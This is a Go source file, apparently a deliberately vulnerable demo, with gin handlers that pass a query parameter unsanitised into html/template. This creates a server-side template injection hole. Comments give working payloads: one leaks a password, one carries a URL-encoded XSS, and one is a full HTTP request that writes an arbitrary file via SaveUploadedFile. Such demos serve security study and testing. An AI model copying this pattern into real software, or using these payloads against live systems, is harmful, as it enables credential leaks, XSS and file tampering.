package unsafe

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"html/template"
)

type User struct {
	ID       int
	Email    string
	Password string
}

// BadTemplate1 unsafe/ssti?q={{.Password}}
func BadTemplate1(c *gin.Context) {
	var tmpl = fmt.Sprintf(`
<html>
<head>
<title>SSTI</title>
</head>
<h1>SSTI Research</h1>
<h2>No search results for %s</h2>
<h2> Hi {{ .Email }} <h2>
</html>`, c.Query("q"))

	t, err := template.New("page").Parse(tmpl)

	if err != nil {
		fmt.Println(err)
	}

	u := User{
		ID:       1,
		Email:    "admin@qq.com",
		Password: "123456",
	}

	{
		err := t.Execute(c.Writer, &u)
		if err != nil {
			return
		}
	}
}

func BadTemplate2(c *gin.Context) {
	var tmpl = fmt.Sprintf(`
<html>
your ip: {{.ClientIP}} <br>
search result for "%s":
</html>`, c.Query("q"))

	t, err := template.New("page").Parse(tmpl)

	if err != nil {
		fmt.Println(err)
	}

	t.Execute(c.Writer, c)
}

/*
ssti场景1:

泄漏密码
/unsafe/ssti?q={{.Password}}

反射xss
/unsafe/ssti1?q=%7b%7bdefine%20%22T1%22%7d%7d%3Cscript%3Ealert%281%29%3C%2fscript%3E%7b%7bend%7d%7d%20%7b%7btemplate%20%22T1%22%7d%7d

*/

/*
ssti场景2：写任意文件

POST /unsafe/ssti2?q=%7b%7b%2e%53%61%76%65%55%70%6c%6f%61%64%65%64%46%69%6c%65%20%28%2e%46%6f%72%6d%46%69%6c%65%20%22%66%69%6c%65%22%29%20%22%2f%74%6d%70%2f%71%77%65%72%31%31%31%22%7d%7d HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: curl/7.64.1
Content-Length: 636
Content-Type: multipart/form-data; boundary=------------------------8d9d289eba116e71
Connection: close

--------------------------8d9d289eba116e71
Content-Disposition: form-data; name="file"; filename="hosts"
Content-Type: application/octet-stream

file content

--------------------------8d9d289eba116e71--

*/

// https://www.imwxz.com/crack_ctf/223.html
// https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html
